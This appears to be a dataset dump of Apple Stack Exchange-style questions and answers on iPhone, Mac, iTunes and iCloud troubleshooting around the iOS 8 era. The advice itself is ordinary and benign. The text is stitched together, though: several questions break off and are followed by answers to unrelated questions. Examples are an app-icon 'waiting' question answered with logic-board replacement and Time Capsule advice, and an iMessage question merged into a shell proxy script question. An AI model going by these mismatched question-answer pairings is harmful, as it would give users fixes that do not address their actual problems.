the same problem.\n\n\n*Create a new Outlook database:\n\n\n*\n\n*Quit all running applications.\n\n*Copy the existing Identity to the desktop (or any other location you prefer).\n\n*Drag the folder ~/Microsoft User Data/Office 2011 Identities/Main Identity/ to the trash, and empty the trash.\n\n*Relaunch Outlook.  The dialog will reference Time Machine, and ask if you want to rebuild your database.  Click \"Rebuild\".  \n\n\n\nThere are some additional Outlook database troubleshooting steps available in the (unofficial) Office for Mac Help site.  You could also try asking your question on the Outlook:Mac forums or the Mac Enterprise mailing list.  If you do post to another forum, you should include some additional information in your post, like OS version, Outlook version, and the email server that you're using.\nAfter you have resolved this issue, it might be worthwhile to see if you can archive some mail.  If your colleague only needs to retain the emails in case they're needed, but doesn't actually refer to them very frequently, you could archive them.  I've seen a few different methods for this, such as creating an Identity per year.  This is outside the scope of your original question, so if this is something you're interested in, you can open another question and I'll answer there. \n", "Q: Problem to initiate update for iOS 8 I have a iPhone 5s, and have still not received any information about on-the-air update to iOS 8. So I decide to update manually through iTunes. iTunes gives me an assuring message\n\niTunes will update your iPhone to iOS 8.0 and will verify the update with Apple.\n\nand when I click OK, nothing happens. No user interface change, no network usage by iTunes, no error messages, nothing at all. And if I click Update button again, the above message shows up again.\nDo anyone have a clue how to fix this?\n\nA: Go into your iPhone's Settings. Select General -> Software Update. Here you can initiate an OTA update. (right now you will be placed in a waiting queue which could range from a few minute to a few hours due to demand). \n\nA: Same problem here. Rebooting iPhone and MacBook solved it for me.\n\nA: I had this issue as well. \n\nMake sure you have the latest version of iTunes (which is 11.4).\n\nNow, assuming, you have updated that. The next step is to follow the prompts within iTunes to update. My updates failed repeatedly, but eventually, I came to the conclusion that I could absolutely not run anything else associated with the internet. I kept iTunes fully maximized throughout the process and that was all I needed to do! Also, now that it is later in the day, there may be less traffic on Apple's servers :)\n", "Q: How to turn off screensaver automatically when \"do not disturb“ is on? When I perform a task in \"do not disturb\" mode, I don't want also to be disturbed by a screensaver. \nCan I automatically turn off the screensaver together with \"do not disturb\"? I.e. to configure it or to automate it by catching an event and triggering an action. \nI know about Caffeine and similar apps, but it bothers me to configure both if only one button should be enough. Also some apps (and TV mirroring) start \"do not disturb\"“ automatically and I want the benefit of not being disturbed by a screensaver as well. \n\nA: If you're using the mouse &/or keyboard, it won't, of course, go to screensaver.\nIf you're not, try System Prefs > Desktop & Screen Saver > Hot Corners.\nI have mine set like this... just shove the cursor to the top left of the main screen & no more nodding off...\n\n", "Q: LT: Is there any benefit to iOS 8 family sharing for couples without kids?

How can I enable them?\n\n\nA: I found why I cannot change any option in this section. This happened because of the restrictions that where activated after the update to iOS 8. In order to solve it go to General->Restrictions->cellular data use-> Allow changes \n\nA: You can restrict apps from using Cellular Data on iOS8. Just switch on your cellular data first, only then will you be allowed to restrict or allow applications to access the data.\nEdit : Apparently, the restriction is enabled automatically for cellular data by default after the update. Remove the restriction to restrict the apps. \n\nA: I figured it out.. There is a restrictions option that restricts changing cellular data settings.Turn that off and you'll be good to go. \n\nA: Once you open each application using cellular date (when you're not connected to wifi) the option to restrict data use will appear\n", "Q: Can't get the app icons to stop displaying \"waiting\" I tried to update multiple apps at once.

This is a known issue for your machine. Your model is subject to a replacement program for the logicboard due to a defective GPU. It lasts 3 years from the date of purchase. If this is already expired, Apple may or may not still replace your logicboard. It is ultimately at the discretion of the store manager. If you don't qualify, your other option would be a flat rate repair, for ~$300. Apple will repair anything wrong with the machine for this fee.

I would, however, caution that these units are notorious for getting 'unhappy' when used in an area that does not have sufficient cooling. Putting one inside the drywall is a bad idea, IMO. Unless you're using a wired connection to connect to your TC, then you're either going to need to set the TC up to extend your existing wireless network or you'll need to have it on its own network. That latter makes no sense, as your Air will not simultaneously connect to multiple wireless networks. To make Time Machine work as intended (hourly, autonomous backups), you need your TC on the same network as you use for surfing and working.\nA TC will quite happily operate without creating a wireless network (Wireless | Network Mode 'Off'). I'd suggest that your ideal configuration would be to have the TC connected with Ethernet to your existing wireless AP running in bridge mode. The TC would get an IP address from the DHCP server in your router. You can then configure the share in the TC and point Time Machine from your Mac to use the share.\n", "Q: How to use iCloud Drive on iPhone and iPad? On the following screenshot from https://www.apple.com/icloud/icloud-drive/, it looks like I can use an iCloud app on iPhone and iPad.  But some webpage such as http://www.imore.com/how-set-and-use-icloud-drive-iphone-and-ipad says that there is no iCloud Drive app.\nI hunted every where on the iPhone 5S and iPad Air which both have iOS 8 and has iCloud enabled, but I can't find such screen as in the screenshot below.\nSo how do I go to the screenshot as below?  I upload a PDF file, a picture, and an mp4 file on my Macbook using the Chrome browser on www.icloud.com, but can't access those files just like how I would use DropBox or Copy (which has 15GB free).\n\n\nA: Those screenshots are from inside Pages, an app which contains support for iCloud Drive and allows you to select any Pages file inside any of your folders in iCloud Drive.\nYou can't just 'access' the files in iCloud Drive in iOS like you can on Dropbox. You need to use an app which supports that filetype and iCloud Drive to be able to open the files.\n\nA: Since iOS 9 we have an iCloud Drive app. (It basically turns the DocumentPicker interface into its own app.) In iOS 9, the iCloud Drive app starts off hidden by default. You can turn it on at any time in the iCloud Drive Settings.\nHow to turn on the iCloud Drive app in iOS 9\n\n\n*\n\n*Launch the Settings app from your Home screen.\n\n*Tap on iCloud.\n\n*Tap on iCloud Drive.\n\n*Switch Show on Home Screen to On.\n\n*Click the Home button to exit Settings.\n\n*Launch the iCloud Drive app from your Home screen.\n\n\nIf you ever decide you want to hide it again, you can repeat the same process and switch it to Off.\nNote: On iOS 10, if you want to hide the iCloud Drive app, you can remove it from your Home screen the same way you would delete an app.\n\nA: There is an iOS app called Documents by Riddle in the app store. This app includes support for browsing and opening files from iCloud Drive. There is also an app called Cloud Drive Explorer.\n\nA: You can certainly access iCloud drive with apps in your iOS8 devices. You can do it by using Pages or Document 5 but not with Cloud Drive Explorer as this app has been removed from iTunes for compatibility issue.  Rather there is a wonderful new third party app available to perform this task.\n\nA: I believe those screenshots are of a third party app called \"Cloud Drive Explorer.\"  It can be downloaded in the app store\n", "Q: How to stop my texts (iMessage) from showing on my Mac Whenever I send or receive messages on my iPhone they show up on my MacBook also.

Can we write a shell script to set my .bash_profile based on network I use (home/ work - no-proxy/proxy)?\n\nA: You may create a separate shell script and source it whenever you are at a \"non-proxified\" location. For example, I have a .unset_proxy.sh under my user directory that I source whenever I need to get work done at home or starbucks. This is what it looks like:\nunset HTTP_PROXY\nunset HTTPS_PROXY\nunset http_proxy\nunset https_proxy\nnpm config delete https-proxy\nnpm config delete http-proxy\nnpm config delete proxy\n\nThis is the command I run:\n    . ~/.unset_proxy\nWhen I'm back at the office building I simply source my bash profile to reset the proxy: \n    . ~/.bash_profile\n", "Q: After home button replacement my screen colour went negative I just replaced my home button.

Did the screen break? Or do I just need to double check the cable?\nThe screen also looks like it's flashing really fast which normally it doesn't.\n\n\nA: That definitely looks like a hardware problem as the invert colours feature doesn't really look like that. The flickering also reinforces this as this would not happen normally. I would reopen the device and make sure that all connections are connected properly and intact.\n", "Q: Mac Mini with Dell UltraSharp U2713H - Not Sharp I have bought myself a 2012 Mac mini and have it hooked up to my Dell Ultrasharp U2713H via HDMI.

They looked for water damage and told me I was able to let them replace my power button. They did not mind about the small crack.\n", "Q: Difference between \"allow notifications\" toggle and dragging to \"do not include\" In iOS 8, the Settings > Notification Center has changed with the addition of an Allow Notifications toggle for each app.\nIf you toggle this to \"off\", the app will automatically go down into the DO NOT INCLUDE area.\nHowever, if you leave the toggle \"on\", you can also manually drag the app down into the DO NOT INCLUDE area.\nIn the latter case, there is still text under the app indicating what types of notifications it has (\"banners, sounds, badges\" etc).\nSo what is the difference between these two situations?\n\nA: Putting an app Do Not Include will not include notifications from that app in the Notification Center. If you do not disable the other notifications then you will still receive the notifications on the lock screen and if you are using the device, but the notifications won't remain in Notification Center. Conversely, if you disable the notifications then the app is automatically moved to Do Not Include as the app will never appear in the Notification Center if there are no notifications.\n", "Q: Remove OTA downloaded (but not installed) iOS 8 I've downloaded the new iOS 8 update on my iPhone 5 but am getting second thoughts about actually installing it.  Is there a way for me to delete that download or am I at the point of no return?\n\nA: You can stop and delete the update of iOS 8 by going to Settings/Usage and selecting the iOS 8 app which will give you the option to delete and it won't auto-download unless you decide to do so by going in the software update option.\n\nA: I did same on iPad2.  I have managed to remove the download (which wasn't installed).  Select settings, general, usage, manage storage when the app list loads, you should see ios8, select this and then delete. Hope you're successful.\n\nA: There's no way to delete downloaded iOS updates.\nSettings | General | Software Update does not feature a delete button.

Could someone help explain the nuances of what is being backed up in a situation where I have deleted my iCloud backups and have turned off Backup, but certain items are still toggled \"on\" in Settings > iCloud?\nAttached is a screenshot to illustrate this situation.  Notice how two items are set to \"on\".  Does that mean they are still getting backed up, even though the Backup option is \"off\"?  If not, then what does being toggled \"on\" mean?\n\n\nA: If iCloud Backup is off, then your device is not being backed up to iCloud, regardless of any other settings.\nEnabled iCloud services will synchronise that data to other devices with those services on. In the screenshot, the Contacts and Calendars services are enabled, which means that the data which is stored in iCloud for these services will be synchronised to all devices with these services enabled.\n", "Q: IOS 8 blocked my phone I just downloaded IOS 8. When I turned my phone on and completed the setup it just restarted the setup process and went back to the screen that says hola. I've tried everything and just can't seem to get my phone to complete the setup process. Right now my phone is useless\nNo error came up, it just went back the the begginging slide\n\nA: Phones can and do crash and need help from iTunes to be restored even if no software change has happened. The most common cause of a failure to update was that the phone was already missing a system file and the update just was the \"messenger\" that checked that file for the first time in a long time.\nWhy not connect it to a computer with iTunes and then restore the OS to clear out any errors? That will rapidly determine if your problem is a temporary software issue or a deeper hardware problem:\n\n\n*\n\n*http://support.apple.com/kb/HT1414 - Use iTunes to restore your iOS device to factory settings\n", "Q: Strange path environment Is it normal to have all this stuff in my path environment?\n\n/Library/Frameworks/Python.framework/Versions/3.4/bin:/Library/Frameworks/Python.framework/Versions/3.4/bin:/Library/Frameworks/Python.framework/Versions/3.4/bin:/Library/Frameworks/Python.framework/Versions/3.4/bin:/Library/Frameworks/Python.framework/Versions/3.4/bin:/Library/Frameworks/Python.framework/Versions/3.4/bin:/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin:/usr/texbin\n\nIt seems I have included the same path many times. I have installed and uninstalled Python 3.4 and Python 3.4.1 a few times because I am still having problems in making the IDLE work correctly due to Tcl/Tk libraries compatibility and stability problems with Mac OS X. Is this maybe the reason of having apparently the same path repeated?\n\nA: The issue is how you have uninstalled python. Deleting the app does remove the code but does not affect anything you have changed elsewhere will not have been undone. In this case the changes to the path have not been undone and as the installer is a simple one it keeps adding the new bit of the path to the existing path.\nTo fix the path you need to find the file where the PATH environment variable is altered. If you are using the bash shell (the default in recent OSX) then. . ideally it should be ~/.bashrc but probably ~/.profile or ~/.bash_profile. See other questions or manuals on what startup file bash uses) Then edit this file so that you have only one Python in it, the lines changing PATH will begin export PATH= \nIn general things are uninstallable if only you know exactly what they changed in install and what they write to at run time. There is no generic way to do this. The best apps have uninstallers which will do the best. You can stop the app running by deleting the .app bundle and most configuration takes up little disk space so the cost of leaving it is not high. Also most .apps do not need edits in bash files so are more self contained.\n\nA: I always recommend using Homebrew: brew.sh\nInstalling, uninstalling, updating etc. of Python and many other useful apps is a breeze if you are a bit familiar with terminal. Even for complete n00b following the guides should not be a problem.\n\nA: I think that I have determined the problem that this person is having.  They might be using a different kind of shell, like .tschrc.  They should look at their startup files, and likely the now unused framework has been added to the path there.\n\nA: Reading the other's answers and comments, Uninstalling seems the idea.\nHowever just dragging into the bin isn't enough, so you'll need to use an app that'll search the system for similar files - AppCleaner.\nI have used AppCleaner several times and can commend to it. It's not for deleting apps,  but can delete settings. widgets, and related files if you drag and drop into it. Just be sure you see what files you are deleting because I often accidentally delete the app installer/zip from my Downloads folder when I need to reinstall it.\nSo my opinion is to use a system scanner that'll look for related files and folders and this should prevent from duplicate paths, files or folders being made.\nJust be sure to see WHAT you are deleting \n", "Q: Using iPhone on VoIP landline? At my home I have a bundled internet connection and a VoIP landline. These services are provided with a Huawei HG659 Wi-Fi modem.\nIs there a way I can connect my iPhone to my VoIP landline via Wi-Fi? I would like to make and receive calls on my fixed landline using my iPhone instead on my old cordless fixed phone?\n\nA: It is not possible for an iPhone to answer calls that are being routed to an analogue SIP port. Depending on your VoIP provider, however, you may be able to install a SIP client, e.g., Acrobits, on your iPhone and configure it to work with your VoIP providers servers.\nIt's unlikely that your VoIP services support the same number to be configured on both your SIP modem and a SIP client on the iPhone, so it would be a case of either your modem is configured to provide VoIP services for your phone number or the iPhone is. It's unlikely that you'd be able to register two different clients to handle the same phone number.\n", "Q: Hibernate/Sleep problem Whenever my MBP 9.1 is in sleep mode and plugged in and I unplug the charger, machine turns on and stays on for about 2 minutes and then gets to sleep again.\nIs there something I can change so when it's in sleep mode and I unplug or plug charger, stays at that state and doesn't hibernate or hybrid sleep or whatever it's name is given by Apple?\nI basically want to disable hibernate altogether by automatic means.\nMy OS X version is 10.9.4.\nThanks.\n\nA: Go to System Preferences > Energy Saver.

Is it normal?  There's been the odd screenshot in the last month or two (from iPhone 5S owners using the iOS8 beta?) showing maybe a few hundred steps and then a few groups of 5, 10, 20 steps – which makes it much easier to read.\nThe total does seem extremely accurate – I've counted in my head a couple of times as I'm going along, and you can also leave the app running and see it add entries as you're walking along – incredibly it can still count  perfectly if you walk but keep your hand really steady...\nBut I don't understand why the groups are so small?\nThere don't appear to be any other problems with my phone – the compass and the spirit level seem very precise, as does the GPS.  I'm not sure how I'd test the barometer (although flights climbed is about right – outdoors anyway – indoors it logs I've climbed the stairs (2x7) about 50% of the time.)\nI've tried with the phone in front and back pockets, I've tried walking faster and slower.  The highest number of steps I've had is ~20 a few times when walking around indoors.  I did wonder if was something to do with it wanting to group steps according to GPS position.  Putting the iPhone into airplane mode doesn't make any difference either.\n\nA: Yes - I see the same very small data sets from the 5s running iOS 8.\nI also get over-estimates of my step count when running and walking yet somehow over the day, I believe the total counts are reliably the same small over-estimation of my actual effort.\nMy only conclusion is that the devices need to handle motion data from people with short legs, tall legs, stiff shoe soles, cushioned running soles, pavement and trail runs, etc...\nI'm sure the engineers know that some class of people are over counted and another are under counted and my suspicion is that they are attempting to be as close to accurate for as large a group as possible and still work within the constraints on the firmware code size/complexity in the motion coprocessors and not drain the battery more than the allowed power budget for each device.\nFWIW - the iPhone 6 is even better at estimating, still has lots of small data bursts logged to health app but still slightly over estimates my effort.\n", "Q: How to close a file and a folder using bash? Is it possible? I would like something which is the opposite of the command open file_or_folder_name. I have searched on the web but I got no results.\n\nA: The open command opens a file in the default application for that file. To close the file in that application, you will need to control the application to close the file. This will depend on what the application is—not all applications support AppleScript control for example and quitting the app is not the same as closing a file.\n\nA: You can use osascript to run an applescript which closes a window in a certain app:\n#!/bin/bash                                                                     \nosascript -e \"tell application \"$1\"                                             \nclose window 1                                                                  \nend tell\"\n\nSave this shell script as \"closewindow\" and do chmod +x closewindow.\nThis way by running:\n$ closewindow appname\n\nyou will close window 1 of appname.\nThere also must be a way to get the number of open windows and close the one that was opened last, but I can't find that right now\n\nA: You cannot directly close a file, this is a responsibility of the application.\nIf quitting the application is an option you can use kill or pkill to quit it.\nOr you can try to use Apple Script to close an individual window. See How do I close a window from an application, passing the file name? on SuperUser\n", "Q: Why first (and only first) iMacs were colored with red, blue, etc? \n(source: andybarratt.co.uk)\nAnd why Apple didn't continue to create iMacs of different color?\n\nA: The original iMac was announced in May 1998 (shipping in August of the same year) and was positioned as a low-end, consumer-grade, internet-oriented model. The colour was Bondi Blue. Apple marketed the model as being the most original new computer since the original Mac of 1984.\nThe graphic in your question was from the so-called '5 Flavors' models announced in January 1999. These models featured a 333 MHz CPU speed, with all other specs being the same as the original iMac.\nThe colours changed, but the styling remained the same until the flat-panel models were introduced in January 2002. The flat-panel iMac was intended to be a more sophisticated product and that air of sophistication has stayed with the iMac image to this day.\n", "Q: Can I view iMessage history from an iPhone set up as a new device? I set up a new iPhone as a new device (not from a backup) but using my same Apple ID for iCloud and so on. Can I view my old iMessages on this phone?\nIf I restore from backup, the messages appear. I set up the phone as a new device because I was getting some strange syncing behaviors.\nI would really like to have my old conversations available. Any way to do this? Are they in iCloud somewhere? Thanks!\n\nA: You can only restore your data (messages are part of your data) by restoring from backup. That should work fine, assuming that the backup iOS version and the new phone iOS version are the same. If your data backup is from an earlier iOS revision than your new phone, all bets are off. \nRestoring your data from backup shouldn't introduce sync problems as the operating system of the phone is not part of the backup scheme.\n", "Q: Temporarily free up space on iPhone 5 Don't really want to delete things but I cannot get OS 8 on phone due to lack of space. Have backed up phone using i tunes to the mac but don't know what to do after that. Can I delete music or photos and get them back easily after the download?? All the sites addressing this are confusing. \n\nA: Have you tried updating your device through iTunes, instead of directly on the device? Click \"check for updates\" on your device's page in iTunes. This method needs less free space than updating through your phone.\nAs long as your music is still on your computer, or you purchased it through iTunes, then yes, it will be easy to restore you music if you need to delete it.\n\nA: Apple's site it pretty clear and included links to free up space on iOS when you want to perform an OTA update.\nSee - http://support.apple.com/kb/TS4431\n", "Q: iPhone Fingerprint sensor for passwords Is there any way I could setup the fingerprint I'd to work in place of typing in my iCloud password whenever prompted, or perhaps even other passwords in keychain?\nI had to upgrade to a 5s yesterday and as is the fingerprint id thing seems pretty useless if I can't set it up as a replacement for passwords.\n\nA: If your device is jailbroken, you can install iTouchSecure which lets you use the Touch ID feature for any password entry area in any app, including iCloud password dialogs.\n\n\n\n\n\n", "Q: When I buy an iPhone 6 from the Apple website and select contract-free from T-Mobile, is the phone carrier unlocked? When Apple were selling iPhone 5s on the site, the T-Mobile option was a subset of \"unlocked\". \nAre the T-Mobile iPhone 6 unlocked?\nIf not how does get an unlocked iPhone 6 unlocked?\n\nA: I found this answer for you\nBest Answer:\nafter speaking with all the following - apple care, apple tech support, apple online sales, and tmobile sales - the \"no contract\" t-mobile phone IS officially unlocked and will work on any gsm carrier with the correct sized sim card. \nBackground: \nA new law eff Aug. 2014 allows you to legally unlock your phone.\nhttp://www.cnet.com/news/president-signs-cell-phone-unlocking-bill-into-law/\nAs result the carrier are adjusting to that by offering unlocked phones true they services in the hope you will stick with them, this time voluntarily and not be forced buy a 2 Years contract.\nBut: (there is always a But)\nIf you do the math, you will come to a result showing that a iPhone purchased without contract and on a cheep provider ($40/M), ends up about the same when purchased with 2 years contract at ($60/M). \nThe reason! the unlocked phones are way more expensive, it is the money you pay upfront. \nSo what is the gain? it is the freedom price you pay, the Freedom of choosing and switching providers at your leisure.\n", "Q: Forgotten iPhone 5S password, but the password is stored in notes I cannot remember the password for my iPhone 5S. The password is written in the Notes app on my phone.\nTouch ID is not an option because it's not working (I haven't set it up).\nIs there any way I can retrieve the password?\n\nA: You can access Notes on icloud.com and on any 10.9 Mac that was synced to your iCloud account.\n", "Q: Stolen mac locked automatically or by thief? My MacBook Pro was stolen a few days ago.  I have a lock on the start up screen requiring a password anytime the laptop comes out of sleep mode, however when I attempted the \"Find My Mac\" app, it says it is already locked (despite me not locking it, putting it in \"lost mode\", or inputting a 4 digit code).  It also is not showing up on location map, possibly pending connecting to the internet?  Could the laptop be automatically locked (without me putting in a 4 digit code) by attempting a restart or logging me out as a user, or could the thief have locked it somehow themselves?\n\nA: I'm encountering this problem in my own home (on Yosemite), so I think it's unlikely that the laptop is actually locked.\nHere in my tests my MBP is tracked with no problem when logged into my user account. However, when I reboot into the Safari-only guest account, I get the message on the Find my Mac interface saying that it was locked XX minutes ago (with XX corresponding to the time since I logged out of my user account). Interestingly, while I don't get position updates in the guest account, I can activate the alarm.\nSo, while I unfortunately do not know how to get Find my Mac working, I think if you have the guest account enabled and since you say you haven't enabled the lock feature then the answer to your question is \"No, it isn't actually locked.\"\n", "Q: iTunes won't sync music library back to iPhone 6 or 5 This is my Bizarro Problem.\nFor a while, I have noticed that my iPhone has lost some of the music files when I sync to the Mac. First it was CDs that I had ripped, and therefore was not associated with an apple id, then it was some music I had downloaded through iTunes. \nThis week, with iOS8, I decided to upgrade my 5, and I got a 6. I am not using iTunes Match. \nTo prepare:\n\n\n*\n\n*Back up to iCloud\n\n*Encrypted back up to iTunes on the Mac\n2-b - download and installed iTunes 11.4 - rebooted.\n\n*Downloaded and installed iOS8 on my 5 successfully\n\n*Picked up 6 today, set up by restoring from my encrypted back up on iTunes\n\n*All Aps, photos, settings, passwords came over fantastically, Music did not. only 300 of 3800 songs synced. \n\n*Went to Music, made sure Sync Music was clicked, and Sync Selected Songs, the blue Audio bar expanded, and I started the sync. It quickly went through the 4 steps to begin copying songs - and then abruptly stopped. this took less than a minute.\n\n*Tried the above with sync all music.  I have 50 gig of memory free, so I have room for the library. \n\n*Switched cord I was using between phone and computer\n\n*Rebuilt iTunes library - which got me to 1400 songs, rather than 300, but still not what I want. \nAnd that is where we are at. \nIdeas?  thoughts?\n\nA: Many users have reported this problem with syncing music on iOS 8. The following steps can be taken to Sync the music back onto your iPhone.\n• Uncheck “sync music” in iTunes\n• Delete Music (General > Usage > Manage Storage)\n• Re-check “sync music”\n• Sync\nI did this and also had to make sure, under the Summary tab in iTunes that \"Sync only checked songs & videos\" AND \"Manually manage music & videos\" were checked. ONLY then did it sync successfully. \n", "Q: iCloud backup won't complete I'm setting up my parents' iPad (Retina, 3rd gen, iOS 8) and trying to enable iCloud backup. We've purchased enough iCloud storage space to back up everything, and I use iCloud backup on all my devices without problems so I know how it works. But after starting the initial backup, it goes through \"Estimating time remaining\" for a while, comes up with an estimate (usually something like 10 or 15 minutes) and then starts increasing the estimate, starting at a few minutes and going up continually until it hits several hours. The progress bar moves to a certain point (about 20%) and just hangs. I've left it sit overnight and in the morning the bar has not moved and the estimate is even higher.\nI tried disabling the camera roll (the largest thing being backed up) and it completes. Enabling it and backing up again hangs in the same spot. It seems that the camera roll is causing the hang, but I don't see how to debug it.\nI've tried disabling iCloud, rebooting, and reenabling, but that doesn't help. Does anyone have any ideas here?\n\nA: Camera Roll is gone in iOS8.  \nIt might be that you would nee the new iCloud Photo Library, part of iCloud Drive, before they will sync again.\nOne thing to do is to migrate any photos you might still have in iPhoto - launch it & you will be given the option - as that's gone too.\nsee http://www.imore.com/yes-camera-roll-gone-ios-8-heres-where-it-went-and-why\nor http://appleinsider.com/articles/14/09/19/goodbye-camera-roll-where-to-find-your-photos-in-ios-8 \n\nA: I was having the same problem, but what I did, after restoring/reseting my iPhone, deleting iCloud backups, etc, was trying to backup in a different network, and worked just fine. In the end, it was my router that was causing trouble. What I did was simply disable IPv6 internet connection. It worked, and fast!\n", "Q: iPhone 4 Filters won't show up on Instagram When I take a photo with my camera and use a filter, I try to upload it to Instagram but it doesn't recognize the filter. It just shows the pic without the filter.\n\nA: This is a known behaviour for pictures edited from camera or photos app on iOS. When you try to load the picture onto Instagram, It loads the original version of the picture (without any filter) that was taken.\nIf you want the picture with iOS Camera filters - Screenshot the picture once you apply the filter and load the screenshot-ed picture on Instagram.\n", "Q: iPhone 5s forwarding automatically to another phone in the household after iOS 8 is installed My son updated his 5s to ios 8 and now for some reason when I call his phone if he doesn't answer it will ring to my daughter's phone and vice versa.   I have looked on both phones and cannot figure out why. The forward feature is not on.\n\nA: The problem you are having is due to the Facetime feature \"iPhone Cellular Calls\" which allows you to \"Use your iPhone cellular connection to make and receive calls on devices signed into your iCloud account when they are nearby and on Wi-Fi.\"  This is fine if all of the devices are your own so that you can answer the call on any of your iDevices but obviously not a good idea for multiple people.\nAre all of the phones signed into the same [primary] iCloud account? Settings > iCloud\nIf so, you have 2 options.\n\n\n*\n\n*Log them out of the primary account and sign in using their own personal AppleID accounts.\n\n\nIf you were using a single iCloud account so everyone has access to a shared account for Music/Movie/App purchases, you should switch over to the new iOS 8 Family Sharing feature.\nIf you haven't created their own AppleID accounts because they were under 13 or you didn't want to include your credit card on their account profile, with the Family Sharing feature, you can create accounts for each child that is automatically part of Family Sharing and all purchases must be approved by you first. See this Apple KB article for more details.\n\n\n*Turn off the iPhone Cellular Calls option in the Settings > Facetime screen.  This will stop the calls from going to multiple devices for now but in the long run, it would be best to set up multiple AppleIDs and start using the Family Sharing feature.\n\n\nTip: When you switch over to the Family Sharing, you can either use the old shared iCloud as your own (the Organizer) or create your own personal account. \n When setting up the Family Sharing, one of the screens will ask if you want to share your purchases or use a different account.  Choose the different account option and use the old shared account.  This 2nd method will share all the previous purchases made under the shared account out to all family members but gives you the option to NOT share your own purchases.  This is helpful for parents to purchase items that the rest of the family shouldn't have access to.  \nIf you want to purchase something that should be shared, either sign into the App Store using the old shared account (just remember to sign out and back into your own account) or simply use one of your kids devices.\nHope this helps :)\n\nA: ...also. i have 5 phones on a shared itunes (iCloud) account and after IOS 8.0.2 all of our phones started ringing when someone called 1 of the phones. This was happening on wifi only.\nturn off iPhone cellular calls under \"settings\", \"facetime\" as the handoff will still work if your on wifi even though it is turned off.\nHope this helps\n\nA: The only way to do this is Settings - phone - calls on other devices - switch to off. \n\nA: Select \"settings\"\nSelect \"general\"\nSelect \"handoff\"\nTurn \"off\"\nYou will note: this is only available on iphone5 or later. I had this problem when upgrading my 5 and my 4, but only calls to my 4 would get forwarded to my 5. Turning this feature off on my iPhone 5 has seemed to clear up the issues.\n\nA: The problem is caused by FaceTime. There is a setting iPhone Mobile Calls:\n\nUse your iphone mobile connection to make and receive calls on devices signed in to your icloud account when they nearby and on wifi.\n\nTurn this feature off.\n\nA: Turn off your Handoff! It is only available for IPhone 5 and up. Go to settings, general. Handoff &Suggested App and turn it off! \nHope it helped\n\nA: I had this problem. Personal iPhone 5 and a iPhone 6 for work. My work phone would ring if I didn't answer my personal phone. I turned off the FaceTime over cellular (as indicated above) on my work phone only, and it no longer rings when my personal phone does. However, I have the Handoff feature set to on, on both phones. So, Handoff does not affect this.\n\nA: I called apple and ios 8 has a feature called Hand Off that comes with the Continuity feature set. You have to go in and turn those off to make it stop.\n\nA: Power the phone off and back on. If that doesn't work, then try a reset, hold the sleep/wake and home buttons together until you see the Apple logo and then release. This will make the phone reboot. This will not affect your data.\n", "Q: How to \"archive\" iTunes files with all metadata? I recently decided to do a big cleanup of my iTunes library. I am low on disk space and have quite a bit of music that I haven't listened to since I was a much younger man, but I can't bring myself to get rid of it completely yet. So what I would like to do is move these tracks to another machine or an external drive, but I don't want to lose any of the metadata, (including dates added, play count etc). Any ideas on a safe and efficient way to do this? I'm running 10.9.4 with up to date iTunes.\n\nA: You can do a manual 'backup' of your existing iTunes library to a separate drive, which then gives you the capacity to restore the library later:\nhttp://support.apple.com/kb/HT1751\nIt's also possible to leave the library version intact and just move the audio files. iTunes marks missing tracks with an exclamation mark. If you try to play a track that has been moved, iTunes will prompt you to locate the track and enable you to point to it. If you wished, you could eventually manually update all your off-disk music.

I have downloaded ios8 and I am struggling to delete individual texts from a message conversation. When I open a message and highlight a text bubble, \"more\" still appears, but when I tick the box, the trash can to delete is missing. The only option given is to click \"Delete All\". It seems that you have to delete the whole conversation, rather than have the option to select the texts you want to keep/delete within it. Am I missing something? Please advise.\n\nA: Press and hold the message to delete, a menu will pop-up with the options \"Copy\" and \"More\". Tap \"More\".\n\nThe message you selected is marked with a checkmark on the left. You can check more or delete all by tapping \"Delete All\" on the top left.\n\nTap the trash after selecting the message to be deleted. A confirmation will appear.

My son's Apple ID has his birthday entered, cough accidentally cough, incorrectly, so it appears that he is 28, when he's actually <13 (it was created when <13 accounts weren't possible).\nWith iCloud Family Sharing, this is problematic.  I'd really like to use this, but an adult gets to purchase items without asking permission, so he needs to be a child first.\nAttempting to change his birthday in the security settings in desktop Safari gives a \"this cannot be changed at this time\" error, and attempting to do so in the Settings app in iOS gives a \"permission from a parent or guardian is required to create an Apple ID for a child of a young age\" error.\nIs there any way that I can correct the year of his birth?  (It would be nice to not have to create an entirely new Apple ID).\n\nA: Apple should be able to do this for you. Go to apple.com/support/appleid/contact/, click Contact Us → Other Apple ID topics → The topic is not listed, enter 'change date of birth' or a phrase to that effect, click Continue and choose an option.\n\nA: I had the same issue, I added my kids to Family Sharing but they showed up as adults (and so could make purchases without my permission). Fortunately you can easily change it. \nIf you go to https://appleid.apple.com and login using their account details, in the Password and Security section, you can change the year of their birth. 1/1/2001 works fine, I think the key is that they need to be over 13 to change from Adult to Child account. I left my kids' birthdays with the correct day and month but used 2001. \nGoing back to the iCloud section on my phone, it shows my kids as \"Age 13\". \n\nA: I called Apple Support to get this done for both of my sons' accounts and the rep told me that there is no way to do this.  He stated that I would need to create new accounts for them and be OK with them losing all of their stuff associated with the existing IDs.\n\nA: The rules around editing child accounts (or turning things into child accounts) seem to be very strict. Child is deemed as being someone under age 13, at least in the UK.\nIt seems:\n\n\n*\n\n*You can't make an adult account into a child account\n\n*You can't change the date of birth on a child account\n\n*You can't remove a child account from a family (you can transfer it to another family)\n\n*You can't stop family sharing for a family with child accounts attached (and - see above - you can't remove them)\n\n\nShort version - you need to set up the child account and do so right first time. Any errors in the date of birth can not be corrected even by Apple (I've been up to senior support advisors on this).\nIf you do make a mistake (as I have) then you can create a new, correct account but the old one will still exist unless someone will transfer it into their family for whatever reason.\n", "Q: How can I get my headset to work with my MacBook Air? (13-inch, Mid 2013) I would love to use my Sennheiser PC350SE headset with my MacBook Air (13-inch, Mid 2013 model).\nI recently purchased a Startech Headset Splitter hoping that this would allow me to use the headphones and microphone together. However the audio continues to play from the Mac, and only the Mac's internal microphone is being detected. I checked the Sound Preferences and found no entry for any external headset or external microphone.\nIs it possible to use a headset with my MacBook Air? Microphone quality is important for me as I take part in a lot of online meetings and don't want the sound interference from other participants, system sounds or background music.\n\nA: You can use the earphone portion of the headset by plugging the appropriate cable into the audio output jack on the Air. The Air does not support plug-in microphones as it only has 1 analog output jack. The boom and Startech splitter will not be of use in this configuration.\nMy recommendation would be to purchase a Mac-compatible stereo headphone + mic to USB adapter. That would enable you to enjoy both quality audio and benefit from the close-field mic boom on the headset. Alternatively, you can just use the headphone part for listening and the built-in mics for 